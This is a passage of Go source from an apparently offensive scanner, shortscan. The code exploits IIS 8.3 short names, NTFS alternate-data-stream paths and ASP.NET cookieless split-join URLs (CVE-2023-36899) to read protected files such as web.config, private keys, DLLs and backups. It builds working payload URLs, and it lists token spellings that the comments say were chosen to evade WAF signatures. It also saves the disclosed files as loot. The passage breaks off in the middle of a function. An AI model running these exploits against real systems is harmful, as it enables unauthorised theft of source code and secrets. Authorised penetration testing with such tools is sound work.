package shortscan

import (
	"fmt"
	"net/http"
	nurl "net/url"
	"os"
	"path/filepath"
	"strings"
	"sync"

	"github.com/fatih/color"
	log "github.com/sirupsen/logrus"
)

// --- auto-chain from -i: collect reconstructed names for a post-scan source probe ---
// A sourceHit is a name recovered inside a protected .NET folder during a -i scan.
// workingURL is set when recovery already proved the cookieless download works (the
// .dll verified 200 through …/b/(S(d))in/…); otherwise probeURL is the clean folder
// path for probeSourceURL to derive and test the split-join payloads itself.
type sourceHit struct {
	probeURL   string
	workingURL string
	name       string
	how        string
}

// sourceHitStore accumulates source-disclosure candidates for one scan. It is
// per-scan (threaded via attackConfig, drained once after the directory loop) so a
// --parallel run never reports one host's hit under another host's block.
type sourceHitStore struct {
	mu   sync.Mutex
	hits []sourceHit
}

func recordSourceHit(ac *attackConfig, h sourceHit) {
	if ac == nil || ac.sourceHits == nil {
		return
	}
	ac.sourceHits.mu.Lock()
	ac.sourceHits.hits = append(ac.sourceHits.hits, h)
	ac.sourceHits.mu.Unlock()
}

func (s *sourceHitStore) drain() []sourceHit {
	s.mu.Lock()
	defer s.mu.Unlock()
	out := append([]sourceHit(nil), s.hits...)
	s.hits = nil
	return out
}

// dotNetProtectedFolders are the special ASP.NET folders that requestFiltering
// hiddenSegments blocks (PT SWARM's recommended targets). Auto source-probing only
// fires for names recovered inside one of these, keeping -i on normal folders quiet.
var dotNetProtectedFolders = map[string]struct{}{
	"bin": {}, "app_code": {}, "app_webreferences": {}, "app_globalresources": {},
	"app_localresources": {}, "app_data": {}, "app_browsers": {}, "app_themes": {},
	// MVC/project convention folders: controllers/models carry raw .cs source, Views
	// carries Razor views (behind a BlockViewHandler deny), App_Start carries the
	// startup/route/auth config (OAuth/JWT secrets), Areas nests more MVC source, and
	// Migrations carries the EF schema + seed data.
	"themes": {}, "views": {}, "models": {}, "controllers": {},
	"areas": {}, "app_start": {}, "migrations": {}, "properties": {},
}

// retrieveShortName attempts DIRECT retrieval of a confirmed 8.3 short name. IIS
// rejects 8.3 in any path component (404.0 canonical-mismatch), but that guard is
// IIS-specific. A non-IIS Windows file tier may pass the alias to NTFS and serve the
// file; this is confirmed for Go's http.FileServer, Node serve-static, and
// MIME-mapped Kestrel StaticFiles aliases on Windows, while nginx and Java remain
// stack-specific until tested. With
// --retrieve-base the enumeration
// (which needs IIS's tilde oracle) and retrieval (against the alternate front-end
// sharing the same NTFS root) can be split.
func retrieveShortName(hc *http.Client, st *httpStats, ac *attackConfig, br baseRequest) {
	if !args.Retrieve {
		return
	}
	// --retrieve reads the 8.3 alias on a NON-IIS tier; against a fingerprinted
	// single-stack IIS host on the same origin it only ever gets IIS's 404.0, so
	// skip the futile pair of probes. An explicit --retrieve-base (a non-IIS tier)
	// overrides the skip.
	if args.RetrieveBase == "" && isSingleStackIIS(schemeHost(br.url)) {
		return
	}
	short := strings.ToUpper(br.file + br.tilde + br.ext) // 8.3 alias; NTFS is case-insensitive
	base := retrieveBaseFor(br.url, args.RetrieveBase)

	// Variant cascade, stopping at the first that serves. The plain alias is the
	// confirmed cross-stack case. ADS handling is parser-specific: Go's standard
	// http.FileServer rejected both file::$DATA and dir::$INDEX_ALLOCATION in the
	// lab, so these fallbacks are only reported when their own controlled GET proves
	// that the selected front-end accepts them.
	canonicalServed := tryRetrieveVariant(hc, st, ac, base, short, br, "canonical 8.3 alias")
	// A named ADS carries data distinct from the file's unnamed stream, so explicit
	// operator-supplied stream probes still run when the canonical alias succeeded.
	// There is no generic HTTP primitive for enumerating unknown stream names; this
	// option verifies known names only and mirrors the suffix on its negative control.
	for _, stream := range args.RetrieveStreams {
		tryRetrieveVariant(hc, st, ac, base, short+":"+stream+":$DATA", br, "named ADS "+stream)
	}
	if canonicalServed {
		return
	}
	// File default data stream candidate. Win32 can open this spelling, but an HTTP
	// front-end may reject the colon before the filesystem sees it.
	if tryRetrieveVariant(hc, st, ac, base, short+"::$DATA", br, "file ::$DATA stream") {
		return
	}
	// Folder index stream: when the retrieve base is a hidden/blocked directory
	// (bin, App_Data) or sits behind a literal-segment path rule, dir::$INDEX_ALLOCATION
	// slips the rule while NTFS resolves it to the same directory.
	if adsBase := indexAllocationBase(base); adsBase != base {
		tryRetrieveVariant(hc, st, ac, adsBase, short, br, "folder ::$INDEX_ALLOCATION")
	}
}

// normalizeRetrieveStream accepts a stream name, optionally in the familiar
// :name:$DATA spelling, and returns just the name. Separators, wildcards, control
// bytes and an additional ':' are rejected so the value cannot escape the selected
// file or change the NTFS stream type.
func normalizeRetrieveStream(raw string) (string, error) {
	for _, r := range raw {
		if r < 0x20 || r == 0x7f {
			return "", fmt.Errorf("stream name %q contains a control character", raw)
		}
	}
	name := strings.TrimSpace(raw)
	name = strings.TrimPrefix(name, ":")
	if len(name) >= len(":$DATA") && strings.EqualFold(name[len(name)-len(":$DATA"):], ":$DATA") {
		name = name[:len(name)-len(":$DATA")]
	}
	if name == "" || strings.EqualFold(name, "$DATA") {
		return "", fmt.Errorf("stream name must not be empty")
	}
	if len([]rune(name)) > 255 {
		return "", fmt.Errorf("stream name is longer than 255 characters")
	}
	if strings.ContainsAny(name, `\\/:*?"<>|`) {
		return "", fmt.Errorf("stream name %q contains a path separator, colon, wildcard, or reserved character", raw)
	}
	return name, nil
}

// sensitiveDisclosureLabel classifies a recovered LONG filename as a high-value
// secret/config worth an active read attempt, returning a short human label.
// Pass the resolved long name (e.g. "web.config"), not the 8.3 alias — the alias
// truncates the extension (.CON/.JSO/.PFX) and would miss the match.
func sensitiveDisclosureLabel(name string) (string, bool) {
	n := strings.ToLower(name)
	if i := strings.LastIndexAny(n, "/\\"); i >= 0 {
		n = n[i+1:]
	}
	switch {
	case n == "properties.dav":
		return "IIS WebDAV custom-property database", true
	case n == "machine.config" || n == "connectionstrings.config":
		return "ASP.NET config", true
	case strings.HasSuffix(n, ".config"): // web.config, app.config, *.config
		return "ASP.NET config", true
	case strings.HasPrefix(n, "appsettings") && strings.HasSuffix(n, ".json"):
		return "app settings (secrets)", true
	case strings.HasSuffix(n, ".pfx"), strings.HasSuffix(n, ".pem"),
		strings.HasSuffix(n, ".key"), strings.HasSuffix(n, ".p12"):
		return "private key/cert", true
	case strings.HasSuffix(n, ".mdf"), strings.HasSuffix(n, ".bak"):
		return "database/backup", true
	}
	return "", false
}

// classifyReadBlock decides which tier refused a same-origin 8.3-alias read, so a
// blocked sensitive file reports WHY instead of a bare status. Distinguishes an
// intercepting front-end (WAF/CDN/LB — a Via/proxy Server header or a status the
// IIS origin would not itself emit) from IIS's own 8.3 canonical-mismatch patch
// (iiscore!CheckIfShortFileName fires on ~[0-9], answering 404.x).
func classifyReadBlock(res *http.Response) string {
	if res == nil {
		return "no response (origin unreachable)"
	}
	server := strings.ToLower(strings.Join(res.Header["Server"], " "))
	via := strings.ToLower(strings.Join(res.Header["Via"], " "))
	frontEnd := via != "" || strings.Contains(server, "google") ||
		strings.Contains(server, "cloudflare") || strings.Contains(server, "nginx") ||
		strings.Contains(server, "envoy") || strings.Contains(server, "awselb")
	iis := strings.Contains(server, "iis") || strings.Contains(server, "microsoft")
	switch {
	case res.StatusCode == 404 && iis && !frontEnd:
		return "reached IIS, blocked by the 8.3 canonical-mismatch patch (CheckIfShortFileName / 404.x) — not readable same-origin"
	case frontEnd && !iis:
		return fmt.Sprintf("blocked at the front-end (%d via proxy/WAF) — the IIS origin was not reached", res.StatusCode)
	case res.StatusCode == 404:
		return "404 — likely IIS 8.3 patch (canonical mismatch); not readable same-origin"
	default:
		return fmt.Sprintf("blocked (%d) before file bytes", res.StatusCode)
	}
}

// attemptCrossStackRead GETs base+readName, guards against a serve-everything front
// end with a random same-shape control, and on a genuine 2xx-with-bytes disclosure
// returns the CRITICAL report lines (saving loot) + true, plus the response (so the
// caller can render a block verdict when nothing leaked). via names the vector for
// the operator (e.g. "trailing-dot web.config."). Shared by the 8.3-alias and the
// trailing-char cross-stack vectors in probeSensitiveAliasRead.
func attemptCrossStackRead(hc *http.Client, st *httpStats, base, readName, controlName, longName, label, via string) ([]string, bool, *http.Response) {
	url := retrieveURL(base, readName)
	res, body, err := fetchBody(hc, st, "GET", url, 1<<16)
	if err != nil || res == nil || res.StatusCode/100 != 2 || len(body) == 0 {
		return nil, false, res
	}
	cres, cbody, _ := fetchBody(hc, st, "GET", retrieveURL(base, controlName), 2048)
	if cres != nil && cres.StatusCode/100 == 2 && len(cbody) > 0 {
		return nil, false, res // serve-everything front end — not a real disclosure
	}
	_, dt := inspectDisclosure(body)
	origin := "same-origin (IIS 8.3 patch absent)"
	if args.RetrieveBase != "" {
		origin = "cross-stack tier"
	}
	if args.Output != "human" {
		printJSON(resultOutput{
			Type: "disclosure", FullMatch: true, SourceDisclosure: true,
			DisclosureType: dt, BaseUrl: base, Fullname: readName, Status: res.StatusCode,
		})
	}
	tag := "8.3-READ/CRITICAL"
	if strings.Contains(strings.ToUpper(base), "$INDEX_ALLOCATION") {
		tag = "INDEX-READ/CRITICAL"
	}
	out := []string{
		"    " + color.HiRedString("[%s] %s (%s) disclosed via %s — %s, %d bytes", tag, longName, label, via, origin, len(body)),
		"    " + color.HiRedString("    URL: %s", url),
	}
	if saved, path, _ := saveDisclosedFile(hc, st, url, strings.ReplaceAll(readName, "::$DATA", "")); saved {
		out = append(out, "    "+color.HiGreenString("    saved -> %s", path))
	}
	return out, true, res
}

// probeSensitiveAliasRead actively attempts a read of a recovered sensitive file's
// 8.3 alias and prints a verdict, so the operator never gets a bare "403 expected"
// on a web.config/key. Unlike retrieveShortName it does NOT skip single-stack IIS:
// on an UNPATCHED host the same-origin alias serves the file (a real leak the skip
// would miss), and on a patched host the attempt names the exact wall and points at
// the cross-stack read. Bounded to sensitive names, so the extra request pair is
// cheap. label is the sensitiveDisclosureLabel of the resolved long name.
func probeSensitiveAliasRead(hc *http.Client, st *httpStats, ac *attackConfig, br baseRequest, dirBase, longName, label string) []string {
	short := strings.ToUpper(br.file + br.tilde + br.ext) // 8.3 alias; NTFS is case-insensitive
	base := retrieveBaseFor(dirBase, args.RetrieveBase)

	// The 8.3 alias is the read vector: on an UNPATCHED same-origin IIS it bypasses
	// the hiddenSegment/404.0 wall (the long name itself stays 404.8 there), and a
	// non-IIS cross-stack tier serves it too. Guarded by a same-shape control so a
	// serve-everything front end can't fake a hit.
	ctrl := strings.ToUpper(randAlnum(6)) + br.tilde + br.ext
	lines, leaked, aliasRes := attemptCrossStackRead(hc, st, base, short, ctrl, longName, label, short)
	if leaked {
		return lines
	}

	// Windows resolves dir::$INDEX_ALLOCATION/child and
	// dir:$I30:$INDEX_ALLOCATION/child to dir/child. Express routing evaluates the
	// URL spelling first, so a middleware mounted on /dir can be skipped while a
	// later express.static/serve-static layer opens the protected child. This is a
	// confirmed read primitive on Express 4.21.2 and 5.2.1 for Windows. Keep it
	// cross-stack-gated and bounded to already recovered sensitive names; each form
	// carries its own random same-extension child control.
	if args.RetrieveBase != "" || !isSingleStackIIS(schemeHost(dirBase)) {
		for _, indexedBase := range indexAllocationBases(base) {
			indexCtrl := randAlnum(12) + extOf(longName)
			via := strings.TrimSuffix(strings.TrimPrefix(indexedBase, strings.TrimSuffix(base, "/")), "/")
			if via == "" {
				via = "directory $INDEX_ALLOCATION namespace"
			}
			if indexLines, indexLeaked, _ := attemptCrossStackRead(hc, st, indexedBase, longName, indexCtrl, longName, label, via); indexLeaked {
				return indexLines
			}
		}
	}

	// Not readable via the 8.3 alias (patched IIS blocks it). Queue the
	// recovered sensitive file for the post-scan cookieless source-probe: the
	// dir-split (hiddenSegments) and extension-split (fileExtensions) collapses can
	// still disclose web.config/secrets/backups on an aggressive-cookieless or
	// unpatched host that the direct reads cannot reach. runSourceAutoChain
	// (enabled under --auto/--full/--index) picks these up and prints only on a hit.
	if ac != nil && ac.sourceHits != nil {
		recordSourceHit(ac, sourceHit{probeURL: retrieveURL(base, longName), name: longName, how: "sensitive-alias"})
	}

	// Not readable: name the wall + the actionable next step instead of a bare status.
	verdict := classifyReadBlock(aliasRes)
	hint := ""
	if args.RetrieveBase == "" && isSingleStackIIS(schemeHost(dirBase)) {
		hint = " — cross-stack read: point --retrieve-base at a non-IIS origin sharing this NTFS root"
	}
	return []string{"    " + color.HiBlackString("[8.3-READ] %s (%s): alias %s %s%s", longName, label, short, verdict, hint)}
}

// retrieveURL joins a raw 8.3 alias onto a base directory URL, letting net/url
// percent-encode the path. An NTFS 8.3 name may legally contain URL-significant
// bytes ('#', '?', '%', '(', …); concatenating them raw corrupts the request —
// most dangerously a '#', which becomes a fragment so the GET silently fetches the
// directory ROOT (e.g. IIS's iisstart welcome page) and the retrieve then reports
// that as a false "disclosure". A trailing ADS token (::$DATA / ::$INDEX_ALLOCATION)
// survives because ':' and '$' are legal unescaped path bytes.
func retrieveURL(base, name string) string {
	u, err := nurl.Parse(base)
	if err != nil {
		return base + name
	}
	u.Path += name
	u.RawPath = ""
	return u.String()
}

// tryRetrieveVariant GETs base+name, guards against a serve-everything false
// positive with a random same-shape (and same-ADS) control, and on a genuine
// disclosure reports and saves it. Returns true when the variant served.
func tryRetrieveVariant(hc *http.Client, st *httpStats, ac *attackConfig, base, name string, br baseRequest, label string) bool {
	url := retrieveURL(base, name)
	res, body, err := fetchBody(hc, st, "GET", url, 1<<16)
	if err != nil || res == nil || res.StatusCode < 200 || res.StatusCode >= 300 || len(body) == 0 {
		return false
	}
	// control: a random same-shape alias (mirroring any ADS suffix) must NOT also
	// serve, else the server answers 200 to everything and this is a false positive.
	short := strings.ToUpper(br.file + br.tilde + br.ext)
	ctrl := strings.ToUpper(randAlnum(6)) + br.tilde + br.ext
	if len(name) > len(short) && strings.EqualFold(name[:len(short)], short) && name[len(short)] == ':' {
		ctrl += name[len(short):]
	}
	if cres, cbody, _ := fetchBody(hc, st, "GET", retrieveURL(base, ctrl), 2048); cres != nil && cres.StatusCode/100 == 2 && len(cbody) > 0 {
		return false
	}
	kind := "file bytes"
	if looksBinary(body) {
		kind = "binary bytes"
	}
	lines := []string{
		"    " + color.HiRedString("[8.3-RETRIEVAL/high] %s served %d %s directly via %s — non-IIS/proxy static tier resolves the alias/stream without IIS's canonical-mismatch guard", name, len(body), kind, label),
		"    " + color.HiRedString("    URL: %s", url),
	}
	saveName := strings.ReplaceAll(name, "::$DATA", "")
	if saved, path, _ := saveDisclosedFile(hc, st, url, saveName); saved {
		lines = append(lines, "    "+color.HiGreenString("    saved -> %s", path))
	} else if path != "" {
		lines = append(lines, "    "+color.HiBlackString("    %s", path))
	}
	ac.emitHuman(lines...)
	return true
}

// indexAllocationBase inserts ::$INDEX_ALLOCATION on the final folder segment of a
// trailing-slash directory URL (/a/bin/ -> /a/bin::$INDEX_ALLOCATION/). Returns the
// input unchanged for the site root or a base that already carries an ADS token.
func indexAllocationBase(base string) string {
	if strings.Contains(strings.ToUpper(base), "$INDEX_ALLOCATION") || strings.Contains(base, "::$") {
		return base
	}
	u, err := nurl.Parse(base)
	if err != nil {
		return base
	}
	p := strings.TrimSuffix(u.Path, "/")
	i := strings.LastIndex(p, "/")
	if i < 0 {
		return base
	}
	u.Path = p + "::$INDEX_ALLOCATION/"
	return u.Scheme + "://" + u.Host + u.EscapedPath()
}

// indexAllocationBases returns both NTFS spellings that alias a directory while
// keeping the child namespace addressable. The first is the compact default-name
// form; the second names the $I30 index explicitly. On non-Windows servers these
// are ordinary nonexistent paths and the paired controls keep the probe silent.
func indexAllocationBases(base string) []string {
	plain := stripIndexAllocation(base)
	if !strings.HasSuffix(plain, "/") {
		plain += "/"
	}
	def := indexAllocationBase(plain)
	u, err := nurl.Parse(plain)
	if err != nil {
		return []string{def}
	}
	p := strings.TrimSuffix(u.Path, "/")
	if p == "" {
		return []string{def}
	}
	u.Path = p + ":$I30:$INDEX_ALLOCATION/"
	u.RawPath = ""
	i30 := u.String()
	if i30 == def {
		return []string{def}
	}
	return []string{def, i30}
}

// retrieveBaseFor returns the directory URL to retrieve 8.3 aliases from: the scan
// base with any ::$INDEX_ALLOCATION stripped and a trailing slash, its origin swapped
// to retrieveBase (scheme+host) when the non-IIS front-end differs from the enum host.
func retrieveBaseFor(rawBase, retrieveBase string) string {
	base := stripIndexAllocation(rawBase)
	if !strings.HasSuffix(base, "/") {
		base += "/"
	}
	if retrieveBase != "" {
		if rb, err := nurl.Parse(retrieveBase); err == nil && rb.Host != "" {
			if u, err := nurl.Parse(base); err == nil {
				u.Scheme, u.Host = rb.Scheme, rb.Host
				base = u.String()
			}
		}
	}
	return base
}

// baseHasCookielessToken reports whether a recovery base URL already carries a
// cookieless session token (i.e. the .dll was verified through the split download
// path). It accepts the literal close-paren `))` and its percent-encoded form `%29`
// so the auto-chain still fires under --session-encoding outer/asymmetric.
func baseHasCookielessToken(raw string) bool {
	return strings.Contains(raw, "))") || strings.Contains(raw, "%29")
}

func isProtectedDotNetFolder(raw string) bool {
	u, err := nurl.Parse(raw)
	if err != nil {
		return false
	}
	for _, seg := range pathSegments(strings.ToLower(u.Path)) {
		if i := strings.Index(seg, "::$"); i >= 0 {
			seg = seg[:i]
		}
		if i := strings.Index(seg, ":$i30:"); i >= 0 {
			seg = seg[:i]
		}
		if _, ok := dotNetProtectedFolders[seg]; ok {
			return true
		}
	}
	return false
}

// stripIndexAllocation removes the ::$INDEX_ALLOCATION / :$I30:$INDEX_ALLOCATION /
// ::$DATA ADS suffix from the last path segment, turning the enumeration base
// (…/bin::$INDEX_ALLOCATION/) back into the real folder (…/bin/) that the source
// download must target.
func stripIndexAllocation(raw string) string {
	u, err := nurl.Parse(raw)
	if err != nil {
		return raw
	}
	if i := strings.Index(strings.ToLower(u.Path), "::$"); i >= 0 {
		u.Path = u.Path[:i]
	} else if i := strings.Index(strings.ToLower(u.Path), ":$i30:"); i >= 0 {
		u.Path = u.Path[:i]
	}
	return u.Scheme + "://" + u.Host + u.EscapedPath()
}

// sourceProbeCandidate joins a recovered child name to the real protected
// directory after removing the enumeration ADS. Keep this construction in one
// place: stripIndexAllocation intentionally returns "/bin" (without a trailing
// slash) for "/bin::$INDEX_ALLOCATION/", and concatenating the child directly
// would silently turn "/bin/App.dll" into the unrelated "/binApp.dll".
func sourceProbeCandidate(rawBase, recoveredName string) string {
	base := strings.TrimSuffix(stripIndexAllocation(rawBase), "/")
	name := strings.TrimLeft(strings.ToLower(recoveredName), "/")
	return base + "/" + name
}

// runSourceAutoChain finishes the PT SWARM chain for every name -i recovered inside a
// protected .NET folder: names whose cookieless download already verified (workingURL)
// are flagged and saved directly; the rest are handed to probeSourceURL to derive and
// test the split-join payloads (covers App_Code/App_Data/… where recovery used the
// plain path).
func runSourceAutoChain(hc *http.Client, st *httpStats, store *sourceHitStore) {
	hits := store.drain()
	seen := make(map[string]struct{})
	var work []sourceHit
	for _, h := range hits {
		key := h.workingURL + "|" + h.probeURL
		if _, ok := seen[key]; ok {
			continue
		}
		seen[key] = struct{}{}
		work = append(work, h)
	}
	if len(work) == 0 {
		return
	}
	// The source-probe is SILENT unless a file actually discloses: on a patched target
	// (the common case) the auto-chain prints nothing here, instead of a wall of
	// identical "[not disclosed]" blocks — one per recovered request-filtered file
	// across a recursive scan (v0.48.3). Each real disclosure frames its own critical
	// section. The aggressive-removal appSetting is GLOBAL, so once one full probe finds
	// no collapse the target is patched everywhere: drop to a cheap shallow (canonical-
	// only) probe for the rest, cutting thousands of redundant requests.
	patched := false
	for _, h := range work {
		if h.workingURL != "" {
			how := h.how
			if how == "" {
				how = "canonical (recovered via index chain)"
			}
			reportSourceDisclosure(hc, st, h.workingURL, h.name, how)
			continue
		}
		if !probeSourceURL(h.probeURL, hc, st, !patched, true) && !patched {
			patched = true
		}
	}
}

// reportSourceDisclosure downloads a known-working cookieless URL once, then frames,
// saves, and mines the recovered bytes. Called only for an already-verified working
// URL, so it always discloses — it prints its own section header. Returns whether it
// disclosed (false only if the one-shot download came back empty).
func reportSourceDisclosure(hc *http.Client, st *httpStats, workingURL, name, how string) bool {
	saved, path, full := saveDisclosedFile(hc, st, workingURL, name)
	if len(full) == 0 {
		return false
	}
	kind := "file bytes"
	if looksBinary(full) {
		kind = "BINARY/PE (DLL) bytes"
	}
	sourceProbeHeader(name)
	printHuman("    " + color.HiRedString("[SOURCE-DISCLOSURE/critical] %s served %s past hiddenSegments via %s cookieless split-join", name, kind, how))
	printHuman("    " + color.HiRedString("    working URL: %s", workingURL))
	if saved {
		printHuman("    " + color.HiGreenString("    saved -> %s", path))
	} else if path != "" {
		printHuman("    " + color.HiBlackString("    %s", path))
	}
	emitAssemblyMetadata(full)
	return true
}

// source.go implements --source-probe: the offensive half of the PT SWARM / DuoDrop
// "Source Code Disclosure in ASP.NET apps" chain (CVE-2023-36899). shortscan already
// enumerates the 8.3 names inside a protected .NET folder (`/bin`, `/App_Code`, …)
// via `--index` (the `::$INDEX_ALLOCATION` oracle survives the hiddenSegments block);
// once the operator reconstructs a full filename, this probe attempts the cookieless
// DOUBLE-TOKEN split-join download that re-forms the protected segment so the native
// requestFiltering hiddenSegment never matches it:
//
//	direct   /bin/App.dll                 -> 404.8 (hiddenSegments)
//	payload  /(S(X))/b/(S(X))in/App.dll   -> 200 + bytes   (bin re-formed after removal)
//
// It works only where the aggressive cookieless path removal is active: an UNPATCHED
// server, OR a fully-patched one that set aspnet:RestoreAggressiveCookielessPathRemoval
// =true (the CVE-2023-36899 fix opt-out), and — for static targets like .dll — with
// runAllManagedModulesForAllRequests=true (the setting PT SWARM found was the cause of
// their success; the MVC template default). On a patched default it stays 404 (the
// inline token removal is disabled), which the probe reports as "not disclosed".
//
// The managed-only token forms that blind <location> controls (--bypass-probe) do NOT
// re-form a hiddenSegment (that needs the canonical aggressive removal), so this probe
// leads with the canonical token and offers managed-only only as a secondary attempt.

// sourceToken is one cookieless token spelling used to bracket each half of the split.
type sourceToken struct {
	label string
	tok   string // inserted as /(tok)/ before half-1 and (tok) glued before half-2
}

// sourceTokens are the cookieless modifier spellings the split-join payload is
// built with. On an aggressive-removal build the two inserted tokens must be
// byte-identical (RemoveAppPathModifier strips the exact modifier set from the
// first token, so a mismatched second token never collapses — see research/09),
// which buildSourcePayload guarantees by reusing one tok for both halves. The
// extra spellings therefore buy WAF/signature EVASION, not new server coverage:
// a front end that blocks the public DuoDrop "(S(X))" pattern (non-empty value,
// S tag) is slipped by the empty-value / alternate-tag / compound forms, each
// verified live to still re-form and read the bytes. They cost nothing on a
// clean target — the per-folder sweep stops at the first confirmed hit, so these
// are only reached when the canonical token failed (e.g. was filtered).
var sourceTokens = []sourceToken{
	{"canonical", "S(X)"},      // /(S(X))/b/(S(X))in/  — the public DuoDrop / PT SWARM form
	{"zero-length", "S()"},     // /(S())/…    empty value: absent from every public PoC, evades non-empty-value signatures
	{"alt-tag", "A()"},         // /(A())/…    anonymous tag instead of S: evades "(S(" signatures, still collapses
	{"forms-tag", "F()"},       // /(F())/…    forms-auth tag: another signature-evading spelling
	{"compound", "A()B()"},     // /(A()B())/…  compound modifier: highly non-standard, evades pattern matches
	{"managed-only", "%53(X)"}, // encoded S: only re-forms where a build inline-decodes %53 before the native recognizer — kept last as a speculative probe
}

// sourceSplitMatch is a bodyless confirmation that a reconstructed long name can
// be reached through the aggressive cookieless split-join.  workingURL is safe to
// hand to reportSourceDisclosure for the single GET that retrieves the file after
// the HEAD oracle has rejected catch-all responses.
type sourceSplitMatch struct {
	workingURL string
	baseURL    string
	token      string
	status     int
}

// sourceSplitCandidateURL builds one canonical split-join URL for a candidate
// enumerated through a protected-folder ADS namespace.  Only the protected ASP.NET
// segment is split; application-root segments are preserved verbatim.
func sourceSplitCandidateURL(rawBase, candidatePath, token string) (string, bool) {
	cleanBase := retrieveBaseFor(rawBase, "")
	u, err := nurl.Parse(cleanBase + candidatePath)
	if err != nil || u.Host == "" {
		return "", false
	}
	segs := pathSegments(u.EscapedPath())
	if len(segs) < 2 {
		return "", false
	}
	for di := len(segs) - 2; di >= 0; di-- {
		decoded, err := nurl.PathUnescape(segs[di])
		if err != nil {
			decoded = segs[di]
		}
		if _, ok := dotNetProtectedFolders[strings.ToLower(decoded)]; !ok {
			continue
		}
		splits := splitSegment(segs[di])
		if len(splits) == 0 {
			return "", false
		}
		pre := append([]string(nil), segs[:di]...)
		post := append([]string(nil), segs[di+1:]...)
		payload := buildSourcePayload(pre, splits[0][0], splits[0][1], post, token)
		return u.Scheme + "://" + u.Host + payload, true
	}
	return "", false
}

func sameSourceHEADSignature(a, b *http.Response) bool {
	if a == nil || b == nil || a.StatusCode != b.StatusCode {
		return false
	}
	if a.ContentLength >= 0 && b.ContentLength >= 0 && a.ContentLength != b.ContentLength {
		return false
	}
	for _, header := range []string{"Content-Type", "ETag", "Last-Modified"} {
		av, bv := a.Header.Get(header), b.Header.Get(header)
		if av != "" && bv != "" && av != bv {
			return false
		}
	}
	return true
}

// probeSourceSplitCandidate verifies an LFN without downloading it.  A candidate
// must return a stable 200 to two HEAD requests while two random same-extension
// siblings do not.  This rejects catch-all 200 handlers and makes large App_Data/bin
// wordlists cheap: wrong candidates cost one bodyless request; only a confirmed hit
// is fetched once by the disclosure reporter.
func probeSourceSplitCandidate(hc *http.Client, st *httpStats, rawBase, candidatePath string) (sourceSplitMatch, error) {
	if !isProtectedDotNetFolder(rawBase) {
		return sourceSplitMatch{}, nil
	}
	upper := strings.ToUpper(rawBase)
	if !strings.Contains(upper, "$INDEX_ALLOCATION") && !strings.Contains(upper, "::$DATA") {
		return sourceSplitMatch{}, nil
	}

	workingURL, ok := sourceSplitCandidateURL(rawBase, candidatePath, sourceTokens[0].tok)
	if !ok {
		return sourceSplitMatch{}, nil
	}
	first, err := fetchStatus(hc, st, http.MethodHead, workingURL)
	if err != nil {
		return sourceSplitMatch{}, err
	}
	if first.StatusCode != http.StatusOK {
		return sourceSplitMatch{}, nil
	}

	ext := extOf(candidatePath)
	for i := 0; i < 2; i++ {
		controlPath := randAlnum(12) + ext
		controlURL, ok := sourceSplitCandidateURL(rawBase, controlPath, sourceTokens[0].tok)
		if !ok {
			return sourceSplitMatch{}, nil
		}
		control, err := fetchStatus(hc, st, http.MethodHead, controlURL)
		if err != nil {
			return sourceSplitMatch{}, err
		}
		if control.StatusCode == http.StatusOK {
			return sourceSplitMatch{}, nil
		}
	}

	repeat, err := fetchStatus(hc, st, http.MethodHead, workingURL)
	if err != nil {
		return sourceSplitMatch{}, err
	}
	if repeat.StatusCode != http.StatusOK || !sameSourceHEADSignature(first, repeat) {
		return sourceSplitMatch{}, nil
	}
	return sourceSplitMatch{
		workingURL: workingURL,
		baseURL:    strings.TrimSuffix(workingURL, candidatePath),
		token:      sourceTokens[0].label,
		status:     repeat.StatusCode,
	}, nil
}

// looksBinary reports whether a body is a PE/binary payload rather than an HTML error.
func looksBinary(body []byte) bool {
	if len(body) >= 2 && body[0] == 'M' && body[1] == 'Z' {
		return true // DOS/PE header — a real DLL/EXE
	}
	// treat a body with NUL bytes in the first chunk as binary (compiled asset)
	n := len(body)
	if n > 512 {
		n = 512
	}
	for i := 0; i < n; i++ {
		if body[i] == 0 {
			return true
		}
	}
	return false
}

// splitSegment returns every internal split of a directory segment into two non-empty
// halves, e.g. "bin" -> [("b","in"),("bi","n")], "App_Code" -> 7 splits.
func splitSegment(seg string) [][2]string {
	var out [][2]string
	for k := 1; k < len(seg); k++ {
		out = append(out, [2]string{seg[:k], seg[k:]})
	}
	return out
}

// buildSourcePayload rebuilds the path with dir segment `di` split at (h1,h2) and a
// cookieless token bracketing each half:  <pre>/(tok)/h1/(tok)h2/<post>
func buildSourcePayload(pre []string, h1, h2 string, post []string, tok string) string {
	var b strings.Builder
	for _, s := range pre {
		b.WriteString("/")
		b.WriteString(s)
	}
	b.WriteString("/(")
	b.WriteString(tok)
	b.WriteString(")/")
	b.WriteString(h1)
	b.WriteString("/(")
	b.WriteString(tok)
	b.WriteString(")")
	b.WriteString(h2)
	for _, s := range post {
		b.WriteString("/")
		b.WriteString(s)
	}
	return b.String()
}

func runSourceProbeMode(urls []string, hc *http.Client, st *httpStats) {
	// Explicit --source-probe: quiet=false, so every target frames its result, negative
	// included — this is a deliberate one-off the operator wants feedback on. Still drop
	// to shallow after the first no-collapse (the aggressive-removal flag is global).
	patched := false
	for _, u := range urls {
		if !probeSourceURL(u, hc, st, !patched, false) && !patched {
			patched = true
		}
	}
}

// sourceProbeHeader frames the source-disclosure output as its own section,
// boxed by sectionRule top and bottom, so this climactic result — the whole
// point of the scan — is never left hanging bare off the previous section's
// body (as it was when it printed as a lone "Source-disclosure probe:" line
// tacked onto the [WEBDAV-LIFT] block). subject is the clean file URL being
// probed. Under bulk-compact (--parallel) the rules are dropped like every
// other section, but the titled line still prints.
func sourceProbeHeader(subject string) {
	title := color.New(color.FgWhite, color.Bold).Sprint("Source-disclosure probe:") + " " + color.HiWhiteString(subject)
	if bulkCompact() {
		printHuman(title)
		return
	}
	printHuman(sectionRule)
	printHuman(" " + title)
	printHuman(sectionRule)
}

// probeSourceURL runs the cookieless split-join disclosure probe on one recovered
// file URL. deep=true sweeps the full dir+ext-split geometry across every token;
// deep=false tries only the canonical geometry (primary token, first split position)
// — the auto-chain drops to shallow once the target has proven patched, because the
// aggressive-removal flag is a GLOBAL appSetting: one confirmed no-collapse means every
// other request-filtered file fails too, so re-sweeping 20 of them is pure waste.
// quiet=true prints NOTHING unless the file actually discloses (the auto-chain: a
// patched target stays silent instead of emitting a wall of "[not disclosed]" blocks).
// quiet=false always frames the result, negative included (explicit --source-probe, a
// deliberate one-off the operator asked for feedback on). Returns whether it disclosed.
func probeSourceURL(raw string, hc *http.Client, st *httpStats, deep, quiet bool) (disclosed bool) {
	u, err := nurl.Parse(raw)
	if err != nil || u.Host == "" {
		if !quiet {
